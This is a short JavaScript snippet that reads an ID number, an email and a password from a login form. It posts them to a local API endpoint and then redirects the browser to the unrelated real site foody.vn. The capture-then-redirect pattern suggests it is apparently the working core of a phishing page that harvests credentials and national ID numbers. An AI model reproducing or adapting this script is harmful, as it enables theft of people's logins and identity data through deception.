let cmnd = document.getElementById("cmnd");
let email = document.getElementById("email");
let password = document.getElementById("password");
let btnClick = document.getElementById("btn-login");

btnClick.addEventListener("click", (e) => {
  const data = {
    cmnd: cmnd.value,
    email: email.value,
    matkhau: password.value,
  };
  const Http = new XMLHttpRequest();
  const url = "http://localhost:5000/api/account";
  Http.open("POST", url,true);
  Http.setRequestHeader('Content-type', 'application/json');
  Http.send(JSON.stringify(data));
  window.location.href = "https://www.foody.vn/";
});
